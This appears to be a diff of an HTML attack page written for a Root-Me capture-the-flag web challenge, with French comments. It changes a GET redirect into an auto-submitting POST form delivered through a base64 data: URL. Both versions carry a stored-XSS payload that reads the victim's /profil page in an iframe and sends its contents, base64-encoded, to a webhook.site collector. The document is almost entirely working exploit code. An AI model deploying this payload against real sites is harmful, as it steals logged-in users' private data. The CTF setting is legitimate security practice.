@@ -2,11 +2,20 @@
 <html>
 <body>
     <script>
-        // On redirige le bot directement sur la page de login du challenge
-        // On ne peut pas faire le POST depuis ici, donc on tente de le 
-        // rediriger vers une URL qui contient notre payload.
-        // Si le site accepte les paramètres en GET (souvent le cas en CTF) :
-        window.location.href = "http://challenge01.root-me.org:58003/login?username=<script>var i=document.createElement('iframe');i.src='/profil';i.onload=()=>{var s=i.contentDocument.body.innerText;new Image().src='https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s='+btoa(s)};document.body.appendChild(i);<\/script>&secret=1234";
+        // On crée un petit fichier HTML complet en base64
+        // Ce fichier contient un formulaire qui s'auto-envoie (auto-submit) dès l'ouverture
+        const payload = `
+        <html>
+        <body onload="document.forms[0].submit()">
+            <form method="POST" action="http://challenge01.root-me.org:58003/login">
+                <input type="hidden" name="username" value="<script>var i=document.createElement('iframe');i.src='/profil';i.onload=()=>{var s=i.contentDocument.body.innerText;new Image().src='https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?s='+btoa(s)};document.body.appendChild(i);<\/script>">
+                <input type="hidden" name="secret" value="1234">
+            </form>
+        </body>
+        </html>`;
+
+        // On redirige le bot vers ce HTML "virtuel"
+        window.location.href = "data:text/html;base64," + btoa(payload);
     </script>
 </body>
 </html>
